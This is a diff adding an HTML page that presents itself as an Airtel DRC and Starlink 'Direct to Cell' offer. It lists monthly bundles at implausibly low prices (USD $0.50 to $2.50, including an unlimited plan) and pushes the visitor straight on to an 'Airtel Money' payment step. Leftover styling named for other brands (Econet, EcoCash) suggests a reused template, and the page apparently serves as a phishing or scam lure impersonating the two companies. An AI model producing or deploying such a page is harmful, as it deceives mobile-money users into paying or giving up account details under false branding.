@@ -1,0 +1,310 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel DRC × Starlink - Direct to Cell</title>
+    <link rel="icon" type="image/png" href="/static/images/airtel_logo.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --econet-blue: #1A3C8F;
+            --econet-dark-blue: #122A6B;
+            --ecocash-red: #E31837;
+            --ecocash-dark-red: #B8102B;
+        }
+        .econet-blue-bg {
+            background-color: var(--econet-blue);
+        }
+        .ecocash-red-bg {
+            background-color: var(--ecocash-red);
+        }
+        .econet-gradient {
+            background: linear-gradient(135deg, var(--econet-blue) 0%, var(--econet-dark-blue) 100%);
+        }
+        .ecocash-gradient {
+            background: linear-gradient(135deg, var(--ecocash-red) 0%, var(--ecocash-dark-red) 100%);
+        }
+        .card-shadow {
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .package-card {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+        .package-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15);
+        }
+        .package-card.selected {
+            border: 2px solid #1A3C8F;
+            background-color: #f0f4ff;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="bg-[#E30613] text-white shadow-sm">
+        <div class="max-w-7xl mx-auto px-3 py-2 flex items-center justify-between">
+            <a href="/" class="flex items-center gap-2">
+                <img src="/static/images/airtel_logo.png" alt="Airtel DRC" class="h-12 object-contain bg-white rounded-md p-1">
+            </a>
+            <nav class="flex gap-6">
+                <a href="/dashboard/" class="text-red-100 hover:text-white flex items-center gap-2">
+                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline" data-fr="Accueil" data-en="Home">Accueil</span>
+                </a>
+                <a href="/plans/" class="text-red-100 hover:text-white flex items-center gap-2">
+                    <i class="uil uil-home"></i> <span class="hidden sm:inline" data-fr="Forfaits" data-en="Plans">Forfaits</span>
+                </a>
+                
+                <div class="flex items-center gap-1 border border-red-200/50 rounded-full px-2 py-1 text-xs" aria-label="Language selector">
+                    <button type="button" data-lang="fr" class="text-red-100" onclick="setAirtelLanguage('fr')">FR</button><span class="text-red-200">/</span><button type="button" data-lang="en" class="font-bold text-white" onclick="setAirtelLanguage('en')">EN</button>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-4xl mx-auto px-2 py-4">
+        
+<div class="space-y-6 pb-16">
+    <section class="bg-gradient-to-br from-[#E30613] via-[#C90412] to-[#8E030D] text-white p-5 sm:p-8 rounded-2xl card-shadow relative overflow-hidden">
+        <div class="relative z-10">
+            <div class="flex flex-wrap items-center gap-3 mb-5">
+                <div class="bg-white rounded-xl px-3 py-2"><img src="/static/images/airtel_logo.png" alt="Airtel DRC" class="h-8 object-contain"></div>
+                <span class="text-red-100 text-xl font-black">×</span>
+                <div class="bg-white rounded-xl px-3 py-2"><img src="/static/images/starlink_logo.png" alt="Starlink" class="h-8 w-24 object-contain"></div>
+            </div>
+            <p class="text-red-100 text-xs font-bold uppercase tracking-[0.2em] mb-3" data-fr="Airtel DRC · Starlink Direct to Cell" data-en="Airtel DRC · Starlink Direct to Cell">Airtel DRC · Starlink Direct to Cell</p>
+            <h1 class="text-3xl sm:text-5xl font-black mb-3 tracking-tight" data-fr="La connectivité satellite, directement sur votre téléphone." data-en="Satellite connectivity, directly on your phone.">La connectivité satellite, directement sur votre téléphone.</h1>
+            <p class="text-base sm:text-lg text-red-100 max-w-3xl" data-fr="Avec Direct to Cell, les téléphones LTE compatibles peuvent se connecter à des satellites Starlink via un opérateur mobile partenaire — sans antenne satellite ni équipement spécial." data-en="With Direct to Cell, compatible LTE phones can connect to Starlink satellites through a mobile network partner — with no satellite dish or special equipment.">Avec Direct to Cell, les téléphones LTE compatibles peuvent se connecter à des satellites Starlink via un opérateur mobile partenaire — sans antenne satellite ni équipement spécial.</p>
+            <p class="text-xs text-red-200 mt-3 max-w-3xl" data-fr="La disponibilité dépend du déploiement local, de la couverture et de la compatibilité du téléphone." data-en="Availability depends on local rollout, coverage, and phone compatibility.">La disponibilité dépend du déploiement local, de la couverture et de la compatibilité du téléphone.</p>
+        </div>
+        <div class="absolute -right-16 -bottom-24 h-64 w-64 rounded-full border-[28px] border-red-200/20"></div>
+        <div class="absolute right-8 bottom-8 h-3 w-3 rounded-full bg-white"></div>
+    </section>
+
+    <form method="POST" id="orderForm" class="space-y-10">
+        <input type="hidden" name="csrfmiddlewaretoken" value="6IW3bPssWybZ1c5P2XYIoao96vbcPn2aIMEeXkUbwCCcHHTWUCToiCn0pVmtwJpE">
+        <section>
+            <div class="flex items-end justify-between gap-4 mb-4">
+                <div>
+                    <p class="text-[#E30613] text-xs font-bold uppercase tracking-[0.2em] mb-2" data-fr="01 · Forfaits Direct to Cell" data-en="01 · Direct to Cell bundles">01 · Forfaits Direct to Cell</p>
+                    <h2 class="text-xl sm:text-2xl font-black text-gray-900" data-fr="Choisissez votre forfait" data-en="Choose your bundle">Choisissez votre forfait</h2>
+                    <p class="text-gray-600 text-sm mt-1" data-fr="Appels, SMS et données mobiles avec un prix mensuel simple en dollars américains." data-en="Calls, SMS, and mobile data with simple monthly pricing in US dollars.">Appels, SMS et données mobiles avec un prix mensuel simple en dollars américains.</p>
+                </div>
+                <span class="hidden sm:inline-flex items-center gap-2 text-xs font-bold text-green-700"><span class="w-2 h-2 rounded-full bg-green-500"></span><span data-fr="Service disponible" data-en="Service available">Service disponible</span></span>
+            </div>
+            <div class="space-y-3">
+                
+                <div class="package-card bg-white border-2 border-gray-200 rounded-xl p-4 card-shadow cursor-pointer hover:shadow-lg transition-all" onclick="selectPackage('12', this)" role="button" tabindex="0" aria-pressed="false" onkeydown="if(event.key === 'Enter' || event.key === ' ') { event.preventDefault(); selectPackage('12', this); }">
+                    <div class="grid grid-cols-1 md:grid-cols-[1.1fr_1.7fr_auto] gap-3 md:gap-6 items-center">
+                        <div>
+                            <span class="text-[#E30613] text-[10px] font-black uppercase tracking-widest" data-fr="Forfait 01" data-en="Bundle 01">Forfait 01</span>
+                            <h3 class="text-lg font-black text-gray-900 mt-1 plan-name" data-plan-position="1">Basic Satellite Bundle</h3>
+                            <span class="bg-red-50 text-[#E30613] text-xs font-bold px-2 py-1 rounded-full inline-block mt-2 plan-data" data-plan-position="1">1GB + 200 Min</span>
+                        </div>
+                        <div class="border-t md:border-t-0 md:border-l border-gray-100 pt-3 md:pt-0 md:pl-6">
+                            <p class="text-gray-700 text-sm font-semibold plan-description" data-plan-position="1">200 Minutes (All Networks) + 1000 SMS + 1GB Data</p>
+                            <p class="text-gray-500 text-xs mt-2 plan-validity" data-plan-position="1">Valable 1 mois</p>
+                        </div>
+                        <div class="md:text-right md:min-w-[150px] border-t md:border-t-0 border-gray-100 pt-3 md:pt-0">
+                            <span class="text-2xl font-black text-[#E30613]">USD $0.50</span>
+                            <span class="text-gray-500 text-xs block mt-1" data-fr="/mois" data-en="/month">/mois</span>
+                            <span class="mt-3 text-xs font-bold text-gray-700 inline-flex items-center gap-2"><span data-fr="Choisir" data-en="Choose">Choisir</span><i class="uil uil-arrow-right text-[#E30613]"></i></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="package-card bg-white border-2 border-gray-200 rounded-xl p-4 card-shadow cursor-pointer hover:shadow-lg transition-all" onclick="selectPackage('13', this)" role="button" tabindex="0" aria-pressed="false" onkeydown="if(event.key === 'Enter' || event.key === ' ') { event.preventDefault(); selectPackage('13', this); }">
+                    <div class="grid grid-cols-1 md:grid-cols-[1.1fr_1.7fr_auto] gap-3 md:gap-6 items-center">
+                        <div>
+                            <span class="text-[#E30613] text-[10px] font-black uppercase tracking-widest" data-fr="Forfait 02" data-en="Bundle 02">Forfait 02</span>
+                            <h3 class="text-lg font-black text-gray-900 mt-1 plan-name" data-plan-position="2">Starlink Connect</h3>
+                            <span class="bg-red-50 text-[#E30613] text-xs font-bold px-2 py-1 rounded-full inline-block mt-2 plan-data" data-plan-position="2">5GB + 500 Min</span>
+                        </div>
+                        <div class="border-t md:border-t-0 md:border-l border-gray-100 pt-3 md:pt-0 md:pl-6">
+                            <p class="text-gray-700 text-sm font-semibold plan-description" data-plan-position="2">500 Minutes (All Networks) + 5000 SMS + 5GB Data</p>
+                            <p class="text-gray-500 text-xs mt-2 plan-validity" data-plan-position="2">Valable 1 mois</p>
+                        </div>
+                        <div class="md:text-right md:min-w-[150px] border-t md:border-t-0 border-gray-100 pt-3 md:pt-0">
+                            <span class="text-2xl font-black text-[#E30613]">USD $1.00</span>
+                            <span class="text-gray-500 text-xs block mt-1" data-fr="/mois" data-en="/month">/mois</span>
+                            <span class="mt-3 text-xs font-bold text-gray-700 inline-flex items-center gap-2"><span data-fr="Choisir" data-en="Choose">Choisir</span><i class="uil uil-arrow-right text-[#E30613]"></i></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="package-card bg-white border-2 border-gray-200 rounded-xl p-4 card-shadow cursor-pointer hover:shadow-lg transition-all" onclick="selectPackage('14', this)" role="button" tabindex="0" aria-pressed="false" onkeydown="if(event.key === 'Enter' || event.key === ' ') { event.preventDefault(); selectPackage('14', this); }">
+                    <div class="grid grid-cols-1 md:grid-cols-[1.1fr_1.7fr_auto] gap-3 md:gap-6 items-center">
+                        <div>
+                            <span class="text-[#E30613] text-[10px] font-black uppercase tracking-widest" data-fr="Forfait 03" data-en="Bundle 03">Forfait 03</span>
+                            <h3 class="text-lg font-black text-gray-900 mt-1 plan-name" data-plan-position="3">Starlink Family</h3>
+                            <span class="bg-red-50 text-[#E30613] text-xs font-bold px-2 py-1 rounded-full inline-block mt-2 plan-data" data-plan-position="3">10GB + 1000 Min</span>
+                        </div>
+                        <div class="border-t md:border-t-0 md:border-l border-gray-100 pt-3 md:pt-0 md:pl-6">
+                            <p class="text-gray-700 text-sm font-semibold plan-description" data-plan-position="3">1000 Minutes (All Networks) + 10000 SMS + 10GB Data</p>
+                            <p class="text-gray-500 text-xs mt-2 plan-validity" data-plan-position="3">Valable 1 mois</p>
+                        </div>
+                        <div class="md:text-right md:min-w-[150px] border-t md:border-t-0 border-gray-100 pt-3 md:pt-0">
+                            <span class="text-2xl font-black text-[#E30613]">USD $1.50</span>
+                            <span class="text-gray-500 text-xs block mt-1" data-fr="/mois" data-en="/month">/mois</span>
+                            <span class="mt-3 text-xs font-bold text-gray-700 inline-flex items-center gap-2"><span data-fr="Choisir" data-en="Choose">Choisir</span><i class="uil uil-arrow-right text-[#E30613]"></i></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="package-card bg-white border-2 border-gray-200 rounded-xl p-4 card-shadow cursor-pointer hover:shadow-lg transition-all" onclick="selectPackage('15', this)" role="button" tabindex="0" aria-pressed="false" onkeydown="if(event.key === 'Enter' || event.key === ' ') { event.preventDefault(); selectPackage('15', this); }">
+                    <div class="grid grid-cols-1 md:grid-cols-[1.1fr_1.7fr_auto] gap-3 md:gap-6 items-center">
+                        <div>
+                            <span class="text-[#E30613] text-[10px] font-black uppercase tracking-widest" data-fr="Forfait 04" data-en="Bundle 04">Forfait 04</span>
+                            <h3 class="text-lg font-black text-gray-900 mt-1 plan-name" data-plan-position="4">Direct to Cell Premium</h3>
+                            <span class="bg-red-50 text-[#E30613] text-xs font-bold px-2 py-1 rounded-full inline-block mt-2 plan-data" data-plan-position="4">20GB + 2000 Min</span>
+                        </div>
+                        <div class="border-t md:border-t-0 md:border-l border-gray-100 pt-3 md:pt-0 md:pl-6">
+                            <p class="text-gray-700 text-sm font-semibold plan-description" data-plan-position="4">2000 Minutes (All Networks) + Unlimited SMS + 20GB Data</p>
+                            <p class="text-gray-500 text-xs mt-2 plan-validity" data-plan-position="4">Valable 1 mois</p>
+                        </div>
+                        <div class="md:text-right md:min-w-[150px] border-t md:border-t-0 border-gray-100 pt-3 md:pt-0">
+                            <span class="text-2xl font-black text-[#E30613]">USD $2.00</span>
+                            <span class="text-gray-500 text-xs block mt-1" data-fr="/mois" data-en="/month">/mois</span>
+                            <span class="mt-3 text-xs font-bold text-gray-700 inline-flex items-center gap-2"><span data-fr="Choisir" data-en="Choose">Choisir</span><i class="uil uil-arrow-right text-[#E30613]"></i></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="package-card bg-white border-2 border-gray-200 rounded-xl p-4 card-shadow cursor-pointer hover:shadow-lg transition-all" onclick="selectPackage('16', this)" role="button" tabindex="0" aria-pressed="false" onkeydown="if(event.key === 'Enter' || event.key === ' ') { event.preventDefault(); selectPackage('16', this); }">
+                    <div class="grid grid-cols-1 md:grid-cols-[1.1fr_1.7fr_auto] gap-3 md:gap-6 items-center">
+                        <div>
+                            <span class="text-[#E30613] text-[10px] font-black uppercase tracking-widest" data-fr="Forfait 05" data-en="Bundle 05">Forfait 05</span>
+                            <h3 class="text-lg font-black text-gray-900 mt-1 plan-name" data-plan-position="5">Unlimited Direct to Cell</h3>
+                            <span class="bg-red-50 text-[#E30613] text-xs font-bold px-2 py-1 rounded-full inline-block mt-2 plan-data" data-plan-position="5">Unlimited All</span>
+                        </div>
+                        <div class="border-t md:border-t-0 md:border-l border-gray-100 pt-3 md:pt-0 md:pl-6">
+                            <p class="text-gray-700 text-sm font-semibold plan-description" data-plan-position="5">Unlimited Minutes + Unlimited SMS + Unlimited Data</p>
+                            <p class="text-gray-500 text-xs mt-2 plan-validity" data-plan-position="5">Valable 1 mois</p>
+                        </div>
+                        <div class="md:text-right md:min-w-[150px] border-t md:border-t-0 border-gray-100 pt-3 md:pt-0">
+                            <span class="text-2xl font-black text-[#E30613]">USD $2.50</span>
+                            <span class="text-gray-500 text-xs block mt-1" data-fr="/mois" data-en="/month">/mois</span>
+                            <span class="mt-3 text-xs font-bold text-gray-700 inline-flex items-center gap-2"><span data-fr="Choisir" data-en="Choose">Choisir</span><i class="uil uil-arrow-right text-[#E30613]"></i></span>
+                        </div>
+                    </div>
+                </div>
+                
+            </div>
+            <input type="hidden" name="package_id" id="selected_package_id" required="">
+        </section>
+
+        <section class="bg-gray-900 text-white rounded-2xl p-5 sm:p-7">
+            <div class="flex items-start gap-4">
+                <div class="flex-shrink-0 bg-white rounded-xl p-2"><img src="/static/images/starlink_logo.png" alt="Starlink" class="h-8 w-20 object-contain"></div>
+                <div>
+                    <p class="text-red-300 text-xs font-bold uppercase tracking-[0.2em] mb-2" data-fr="02 · Comment ça marche" data-en="02 · How it works">02 · Comment ça marche</p>
+                    <h2 class="text-xl sm:text-2xl font-black" data-fr="Direct to Cell relie les téléphones aux satellites." data-en="Direct to Cell connects phones to satellites.">Direct to Cell relie les téléphones aux satellites.</h2>
+                    <p class="text-gray-300 text-sm leading-relaxed mt-3" data-fr="Le réseau Starlink est conçu pour fonctionner comme une tour cellulaire dans l'espace. Avec un partenaire mobile autorisé, un téléphone LTE compatible peut envoyer des messages et utiliser des services pris en charge lorsqu'il n'y a pas de couverture terrestre." data-en="The Starlink network is designed to work like a cell tower in space. With an authorized mobile partner, a compatible LTE phone can send messages and use supported services where terrestrial coverage is unavailable.">Le réseau Starlink est conçu pour fonctionner comme une tour cellulaire dans l'espace. Avec un partenaire mobile autorisé, un téléphone LTE compatible peut envoyer des messages et utiliser des services pris en charge lorsqu'il n'y a pas de couverture terrestre.</p>
+                    <p class="text-gray-500 text-xs mt-3" data-fr="La compatibilité, la couverture et les services disponibles peuvent varier selon le pays et le déploiement." data-en="Compatibility, coverage, and available services may vary by country and rollout.">La compatibilité, la couverture et les services disponibles peuvent varier selon le pays et le déploiement.</p>
+                </div>
+            </div>
+        </section>
+    </form>
+</div>
+
+<div id="redirectModal" class="fixed inset-0 z-50 hidden flex items-center justify-center bg-black bg-opacity-60 backdrop-blur-sm px-4" role="dialog" aria-modal="true" aria-labelledby="processingTitle">
+    <div class="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 text-center shadow-2xl">
+        <div class="mb-6"><div class="w-20 h-20 border-4 border-[#E30613] border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><div class="flex items-center justify-center gap-2"><img src="/static/images/airtel_logo.png" alt="Airtel DRC" class="h-10 object-contain"><span class="font-black text-gray-400">×</span><img src="/static/images/starlink_logo.png" alt="Starlink" class="h-10 w-20 object-contain"></div></div>
+        <h3 id="processingTitle" class="text-2xl font-bold text-gray-900 mb-2" data-fr="Préparation de votre activation" data-en="Preparing your activation">Préparation de votre activation</h3>
+        <p class="text-gray-600" data-fr="Vous allez continuer vers l'étape Airtel Money." data-en="You will continue to the Airtel Money step.">Vous allez continuer vers l'étape Airtel Money.</p>
+        <p class="text-sm text-gray-400 mt-4" data-fr="Ne fermez pas cette page." data-en="Please do not close this page.">Ne fermez pas cette page.</p>
+    </div>
+</div>
+
+<script>
+    const starlinkPlanTranslations = {
+        1: { fr: { name: 'Basic Satellite Bundle', data: '1GB + 200 Min', description: '200 Minutes (All Networks) + 1000 SMS + 1GB Data', validity: 'Valable 1 mois' }, en: { name: 'Basic Satellite Bundle', data: '1GB + 200 Min', description: '200 Minutes (All Networks) + 1000 SMS + 1GB Data', validity: 'Valid for 1 month' } },
+        2: { fr: { name: 'Starlink Connect', data: '5GB + 500 Min', description: '500 Minutes (All Networks) + 5000 SMS + 5GB Data', validity: 'Valable 1 mois' }, en: { name: 'Starlink Connect', data: '5GB + 500 Min', description: '500 Minutes (All Networks) + 5000 SMS + 5GB Data', validity: 'Valid for 1 month' } },
+        3: { fr: { name: 'Starlink Family', data: '10GB + 1000 Min', description: '1000 Minutes (All Networks) + 10000 SMS + 10GB Data', validity: 'Valable 1 mois' }, en: { name: 'Starlink Family', data: '10GB + 1000 Min', description: '1000 Minutes (All Networks) + 10000 SMS + 10GB Data', validity: 'Valid for 1 month' } },
+        4: { fr: { name: 'Direct to Cell Premium', data: '20GB + 2000 Min', description: '2000 Minutes (All Networks) + Unlimited SMS + 20GB Data', validity: 'Valable 1 mois' }, en: { name: 'Direct to Cell Premium', data: '20GB + 2000 Min', description: '2000 Minutes (All Networks) + Unlimited SMS + 20GB Data', validity: 'Valid for 1 month' } },
+        5: { fr: { name: 'Unlimited Direct to Cell', data: 'Unlimited All', description: 'Unlimited Minutes + Unlimited SMS + Unlimited Data', validity: 'Valable 1 mois' }, en: { name: 'Unlimited Direct to Cell', data: 'Unlimited All', description: 'Unlimited Minutes + Unlimited SMS + Unlimited Data', validity: 'Valid for 1 month' } }
+    };
+    function updateStarlinkPlans(language) {
+        document.querySelectorAll('.plan-name, .plan-data, .plan-description, .plan-validity').forEach(function (element) {
+            const plan = starlinkPlanTranslations[element.dataset.planPosition];
+            if (!plan) return;
+            const copy = plan[language === 'en' ? 'en' : 'fr'];
+            if (element.classList.contains('plan-name')) element.textContent = copy.name;
+            if (element.classList.contains('plan-data')) element.textContent = copy.data;
+            if (element.classList.contains('plan-description')) element.textContent = copy.description;
+            if (element.classList.contains('plan-validity')) element.textContent = copy.validity;
+        });
+    }
+    window.airtelPageLanguageChanged = function(language) { updateStarlinkPlans(language === 'en' ? 'en' : 'fr'); };
+    function selectPackage(id, element) {
+        document.getElementById('selected_package_id').value = id;
+        document.querySelectorAll('.package-card').forEach(card => { card.classList.remove('selected', 'ring-2', 'ring-red-600'); card.setAttribute('aria-pressed', 'false'); });
+        element.classList.add('selected', 'ring-2', 'ring-red-600');
+        element.setAttribute('aria-pressed', 'true');
+        document.getElementById('redirectModal').classList.remove('hidden');
+        setTimeout(() => document.getElementById('orderForm').submit(), 900);
+    }
+</script>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#1A3C8F] text-blue-200 py-6 mt-8">
+        <div class="max-w-7xl mx-auto px-3">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
+                <div>
+                    <h3 class="text-white font-bold mb-4">AIRTEL DRC × STARLINK</h3>
+                    <p class="text-sm" data-fr="Direct to Cell : la connectivité satellite vers les téléphones compatibles." data-en="Direct to Cell: satellite connectivity for compatible phones.">Direct to Cell : la connectivité satellite vers les téléphones compatibles.</p>
+                </div>
+                <div>
+                    <h3 class="text-white font-bold mb-4" data-fr="ASSISTANCE" data-en="SUPPORT">ASSISTANCE</h3>
+                    <p class="text-sm">Email: support@airtel.cd</p>
+                    <p class="text-sm" data-fr="Une assistance pour vous accompagner." data-en="Support to help you every step of the way.">Une assistance pour vous accompagner.</p>
+                </div>
+                <div>
+                    <h3 class="text-white font-bold mb-4" data-fr="PAIEMENT" data-en="PAYMENT">PAIEMENT</h3>
+                    <p class="text-sm" data-fr="Payez avec Airtel Money et gardez votre téléphone à portée de main." data-en="Pay with Airtel Money and keep your phone close by.">Payez avec Airtel Money et gardez votre téléphone à portée de main.</p>
+                </div>
+            </div>
+            <div class="border-t border-blue-700 pt-4 text-center">
+                <p data-fr="© 2026 Airtel DRC. Tous droits réservés." data-en="© 2026 Airtel DRC. All rights reserved.">© 2026 Airtel DRC. Tous droits réservés.</p>
+            </div>
+        </div>
+    </footer>
+    <script>
+      function setAirtelLanguage(language) {
+        const selected = language === 'en' ? 'en' : 'fr';
+        document.documentElement.lang = selected;
+        document.querySelectorAll('[data-fr][data-en]').forEach(function (element) {
+          const text = element.getAttribute('data-' + selected);
+          if (text !== null) element.innerHTML = text;
+        });
+        document.querySelectorAll('[data-lang]').forEach(function (button) {
+          const active = button.getAttribute('data-lang') === selected;
+          button.classList.toggle('font-bold', active);
+          button.classList.toggle('text-white', active);
+          button.classList.toggle('text-red-100', !active);
+        });
+        try { localStorage.setItem('airtel-language', selected); } catch (error) {}
+        if (typeof window.airtelPageLanguageChanged === 'function') window.airtelPageLanguageChanged(selected);
+      }
+      document.addEventListener('DOMContentLoaded', function () {
+        let language = 'en';
+        try {
+          const stored = localStorage.getItem('airtel-language');
+          language = stored === 'fr' || stored === 'en' ? stored : 'en';
+          if (language !== 'en') {
+            localStorage.setItem('airtel-language', 'en');
+            language = 'en';
+          }
+        } catch (error) {}
+        localStorage.setItem('airtel-language', 'en');
+        setAirtelLanguage('en');
+      });
+    </script>
+
+
+</body></html>
